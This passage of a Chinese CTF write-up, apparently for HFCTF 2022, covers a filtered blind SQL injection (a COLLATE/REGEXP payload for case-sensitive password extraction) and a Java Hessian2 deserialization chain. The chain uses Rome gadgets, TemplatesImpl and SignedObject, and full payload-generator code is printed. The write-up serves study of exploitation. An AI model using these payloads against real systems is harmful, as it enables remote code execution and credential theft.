<p>注密码的时候发现密码有特殊字符，就有点难办，毕竟还有过滤，如果特殊字符还是过滤里面的就不好搞了，并且本身正则特殊字符有特殊含义也不好测。然后想起来like这个语句的语法特殊一些，就支持<code>_%</code>两个通配符，就能完整的注出用户名和密码</p>
<p>但是这里还有一个非常严峻的问题，密码没有大小写区分，而最后比对的时候必然区分大小写，题目不让用binary，且正则默认不区分大小写。想用正则的[a-z]这种区间写法但是短横线也不给用，[:upper:]这种语法能给我也把小写匹配上了。。。我当场大无语</p>
<p>然后数了下密码的字母位数，17位。想着要不就爆破算了，打不了跑四五个小时。。。</p>
<p>然后我就先睡了，第二天起来发现队友翻SQL文档翻到了这个collate操作打通了，加上即可</p>
<pre><code>&#39;||case`username`collate&#39;utf8mb4_bin&#39;regexp&#39;^&#123;&#125;&#39;when&#39;1&#39;then~0+1+&#39;&#39;else&#39;&#39;end&amp;&amp;&#39;1
</code></pre>
<p>本地打的时候究极报错utf8mb4_bin和latin1字符集不匹配，然而我整个表的字符集都是utf8mb4来着</p>
<p>后来赛后交流发现他们多或一下写另一个正则语句然后把正则写成错的也行，但需要额外的操作，需要在第一个regexp的开头加一个<code>@tmp:=</code>，这是个啥玩意啊，完全看不懂，搜到的结果是可以替代空格，但是他们加了个这个之后就会导致前面的正则成功后后面的正则不判断了，否则都判断。太抽象了</p>
<blockquote>
<p>@tmp:&#x3D;test只能用在select关键字之后，等号后面的字符串随意</p>
</blockquote>
<p>mysql的或逻辑本来就非常的诡异，并不是从左往右顺序执行的，可能本身和表达式的类型也有关</p>
<h2 id="ez-chain"><a href="#ez-chain" class="headerlink" title="ez_chain"></a>ez_chain</h2><p>究极java。给的是一个没见过的全新反序列化。因为最近在学java所以会尽可能的写的详细一点</p>
<pre class=" language-java"><code class="language-java">        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span>HttpExchange t<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>
            String query <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> queryMap <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">queryToMap</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>
            String response <span class="token operator">=</span> <span class="token string">"Welcome to HFCTF 2022"</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>queryMap <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                String token <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>queryMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                String secret <span class="token operator">=</span> <span class="token string">"HFCTF2022"</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>Objects<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span> <span class="token operator">==</span> secret<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>secret<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    InputStream is <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                    <span class="token keyword">try</span> <span class="token punctuation">{</span>
                        Hessian2Input input <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hessian2Input</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        input<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var9<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        response <span class="token operator">=</span> <span class="token string">"oops! something is wrong"</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    response <span class="token operator">=</span> <span class="token string">"your token is wrong"</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>

            t<span class="token punctuation">.</span><span class="token function">sendResponseHeaders</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>response<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            OutputStream os <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">getResponseBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            os<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
</code></pre>
<h3 id="过hashCode"><a href="#过hashCode" class="headerlink" title="过hashCode"></a>过hashCode</h3><p>直接碰也不是不行，但实际上java String类的hashCode函数非常的简单，所以可以直接构造一下<img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323150431540.png" alt="image-20220323150431540"></p>
<p>初始情况下hash都是0，这个值的作用就是在当前字符串计算过hash之后再次调用不会再算一次。所以只需要将第一个字符-1再将第二个字符+31即可实现一个hash相同的字符串<code>GeCTF2022</code></p>
<h3 id="Hessian2-反序列化"><a href="#Hessian2-反序列化" class="headerlink" title="Hessian2 反序列化"></a>Hessian2 反序列化</h3><p>Hessian2，这个是一个不同于java反序列化的东西，它实现了自己的一套序列化反序列化流程，因此其利用链也与java反序列化的利用链不一致。但其同样存在反序列化漏洞，存在着与java反序列化不同的利用链，使用marshal工具可以生成对应的payload。从给出的依赖来看可以使用链的就是Rome的jndi注入。给出了dockerfile，目标的jdk版本为8u181，可以打reference直接打通，但是compose里写了给内网，又到了经典java不出网利用环节。以及不出网的jndi应该是没法打的吧。。</p>
<p>这里一开始想试一下出网的情况下这个环境能不能打通，试了半天没反应，最后才发现。。。我用的是jdk8u311。以及marshal生成payload的时候要把ldap协议带上。。。。总觉得这个错误犯了好几次了</p>
<h3 id="Rome反序列化"><a href="#Rome反序列化" class="headerlink" title="Rome反序列化"></a>Rome反序列化</h3><p>先跟一下调用链吧。不然搞不清楚的。他这个地方反序列化打通了也不会出现报错，不像CC基本上都会崩掉直接输出调用栈好下断点。。。只能想办法找到在哪触发然后手下断点了</p>
<p>可以先看一下marshal里payload怎么写的来下断点，目测下在EqualBean和ToStringBean处，然后硬调。</p>
<p>经过了约莫大半个小时的调试，理出来了整个调用链<br>如前文所言，Hessian2实现了自己的反序列化流程，对于hashmap对象进行反序列化时，会使用一个MapDeserializer进行反序列化，其readMap方法中将map的值一一还原</p>
<pre class=" language-java"><code class="language-java">        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>in<span class="token punctuation">.</span><span class="token function">isEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span>Map<span class="token punctuation">)</span>map<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
</code></pre>
<p>调用put方法，put方法会对key的hash进行计算，调用key的hashCode方法。而这里的key是EqualBean，其重写了hashCode方法，调用了自己的beanHashCode方法，进一步调用了自己的obj成员的toString方法<br>这里EqualBean的obj为ToStringBean，toString如下</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323150900729.png" alt="image-20220323150900729"></p>
<p>ToStringBean的obj为payload JdbcRowSetImpl，prefix获取到该值进入有参数的toString方法<br>这个方法会反射的把这个类的各种getter调用一遍（看的不是很懂，但是感觉是这个样子的，不知道能不能调private的）</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323150933248.png" alt="image-20220323150933248"></p>
<p>当对databaseMetaData这个属性的getter进行调用时，调用了connect触发了lookup。</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> DatabaseMetaData <span class="token function">getDatabaseMetaData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> SQLException <span class="token punctuation">{</span>
        Connection var1 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">getMetaData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>说起来这个东西我一开始调试到了这个函数但是没觉得这个函数会触发就略过了。。。</p>
<p>就调试情况而言可以认为该反序列化的触发点有两个，一个是寻找重写了hashCode方法的类，另一个是ToStringBean中的任意getter调用。说起调用getter触发的反序列化，那就全自动联想fastjson的几个payload。</p>
<p>fastjson三个利用这里已经用掉一个Jdbc了，tomcat的BCEL这里没有用不了，try1try经典templatesImpl</p>
<h3 id="templatesImpl不能用"><a href="#templatesImpl不能用" class="headerlink" title="templatesImpl不能用"></a>templatesImpl不能用</h3><p>简单缝合了一下marshal，写了个templatesImpl的payload</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>rometools<span class="token punctuation">.</span>rome<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>EqualsBean<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>rometools<span class="token punctuation">.</span>rome<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>ToStringBean<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TransformerFactoryImpl<span class="token punctuation">;</span>

<span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>Templates<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Array<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RomeTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span> Object<span class="token operator">></span> <span class="token function">makeMap</span> <span class="token punctuation">(</span> Object v1<span class="token punctuation">,</span> Object v2 <span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span> Object<span class="token operator">></span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field f <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> nodeC<span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            nodeC <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.HashMap$Node"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span> ClassNotFoundException e <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            nodeC <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.HashMap$Entry"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        Constructor<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> nodeCons <span class="token operator">=</span> nodeC<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> nodeC<span class="token punctuation">)</span><span class="token punctuation">;</span>
        nodeCons<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        Object tbl <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>nodeC<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Array<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tbl<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nodeCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Array<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tbl<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> nodeCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field tf <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"table"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> tbl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> s<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> evilCode <span class="token operator">=</span> SerializeUtil<span class="token punctuation">.</span><span class="token function">getEvilCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        TemplatesImpl templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        SerializeUtil<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>evilCode<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        SerializeUtil<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"cat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        SerializeUtil<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        ToStringBean toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span>Templates<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span>
        EqualsBean equalsBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span>ToStringBean<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>
        HashMap evilMap <span class="token operator">=</span> <span class="token function">makeMap</span><span class="token punctuation">(</span>equalsBean<span class="token punctuation">,</span> equalsBean<span class="token punctuation">)</span><span class="token punctuation">;</span>

        HessianBase hb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HessianBase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> hb<span class="token punctuation">.</span><span class="token function">marshal</span><span class="token punctuation">(</span>evilMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>codes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>然后调试一下，同上述反序列化利用链情况，通过get调用到了getOutputProperties，然后进newTransformer，getTransletInstance，defineTransletClasses。一切看起来都很顺利，而defineTransletClasses里面就有我们最喜欢的从bytecode中define class并返回出来进行newInstance的操作。然而也就是在这里出错了。这里调用了_tfactory的getExternalExtensionsMap()方法，而由于_tfactory是一个transient的变量，因此在序列化时不会被写入，也就意味着在这里是null，调用null的方法抛出了一个错误，导致该利用链失败了，fastjson是手动赋值上去并触发的，倒无所谓，也因此需要支持给private变量赋值才能使用，但那原来CC那些不也应该是这样子的吗？（我还真没思考过这个问题，或者说我没注意到这个变量是transient的。。。</p>
<p>开调！<br>CC的链随便缝一个用，这里用的是InstantiateTransformer直接newInstance的实现。快进到newInstance处<br><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323151547353.png" alt="image-20220323151547353"><br>查看iArg的值，iArg就是我们写payload的时候塞在InstantiateTransformer中的templatesImpl<br><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323151638420.png" alt="image-20220323151638420"></p>
<p>居然_tfactory有一个值，给我整麻了，理论上来说transient关键字的意思就是序列化的时候不会被写入啊？</p>
<p>再次得到java大师feng师傅的指导，原来是templatesImpl的readObject的最后一句直接new了一个tfactory上来。。。</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323151944239.png" alt="image-20220323151944239"></p>
<p>行吧，所以说原理就是Hessian2自己实现的反序列化中并没有对这些操作进行额外的复现，导致最后反序列化出来的templatesImpl类少了一个tfactory属性，导致payload无法触发（既然如此平常CC链序列化的时候又赋值一个tfactory又有什么意义呢。。。？序列化的时候都根本没有用过这个值。。。）</p>
<p>那么说到这里解法也就已经呼之欲出了，找到一个二次反序列化的点，并使用java原生readObject进行反序列化，即可完成整个攻击<br>上次tctf的buggyloader也是题目给的反序列化有问题找一个二次反序列化使用原生靠谱readObject打通的来着，但是这回我一开始都没弄清楚怎么回事，那个时候搜到了Rome的templatesImpl但是因为依赖包的奇怪错误坑的我有点混乱</p>
<h3 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h3><p>算了吧，自动化挖掘完全不会，之前codeql坐牢还没做完，并且这种闭源代码，或者说没有直接源码可以编译的情况下，codeql完全用不了。改天学一下这种东西</p>
<p>我直接抄答案<br><code>java.security.SignedObject</code><br>还有这种东西，这个类也太猛了吧，自带的二次反序列化。。。</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323154700790.png" alt="image-20220323154700790"></p>
<p>get触发，直接看下能不能给fastjson用，然后content是一个private属性且无setter，和templatesImpl一样了，散了。以及fastjson是对存在的类成员名对应的getter进行调用吧（没仔细跟过），这个ToStringBean的getter调用有点怪，简单跟了一下没看懂，有一个地方莫名其妙的就返回了所有的getter方法，感觉是调用所有get开头的函数，而不是根据成员变量名去寻找getter</p>
<p>总之就是能触发到getObject函数</p>
<p>然后readObject打一套正常反序列化，HashMap的readObject本身也会调用hash函数去计算hash，仍然可以使用Rome的EqualsBean这一套</p>
<p>缝合一下，得到payload</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> evilCode <span class="token operator">=</span> SerializeUtil<span class="token punctuation">.</span><span class="token function">getEvilCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        TemplatesImpl templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        SerializeUtil<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>evilCode<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        SerializeUtil<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"cat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        SerializeUtil<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        ToStringBean toStringBean_t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span>Templates<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span>
        EqualsBean equalsBean_t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span>ToStringBean<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean_t<span class="token punctuation">)</span><span class="token punctuation">;</span>
        HashMap evilMap_t <span class="token operator">=</span> <span class="token function">makeMap</span><span class="token punctuation">(</span>equalsBean_t<span class="token punctuation">,</span> equalsBean_t<span class="token punctuation">)</span><span class="token punctuation">;</span>

        Signature signature <span class="token operator">=</span> Signature<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        KeyPairGenerator kg <span class="token operator">=</span> KeyPairGenerator<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        kg<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        KeyPair kp <span class="token operator">=</span> kg<span class="token punctuation">.</span><span class="token function">genKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        SignedObject signedObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SignedObject</span><span class="token punctuation">(</span>evilMap_t<span class="token punctuation">,</span>kp<span class="token punctuation">.</span><span class="token function">getPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>signature<span class="token punctuation">)</span><span class="token punctuation">;</span>

        ToStringBean toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span>SignedObject<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> signedObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
        EqualsBean equalsBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span>ToStringBean<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>
        HashMap evilMap <span class="token operator">=</span> <span class="token function">makeMap</span><span class="token punctuation">(</span>equalsBean<span class="token punctuation">,</span> equalsBean<span class="token punctuation">)</span><span class="token punctuation">;</span>

        HessianBase hb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HessianBase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> hb<span class="token punctuation">.</span><span class="token function">marshal</span><span class="token punctuation">(</span>evilMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>codes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>缝合的时候写了垃圾代码，ToStringBean里面塞了个TemplatesImpl类，实际上应该塞Templates类，Templates类里面只有一个getOutputProperties，而TemplatesImpl里面一堆getter，会调用到一个</p>
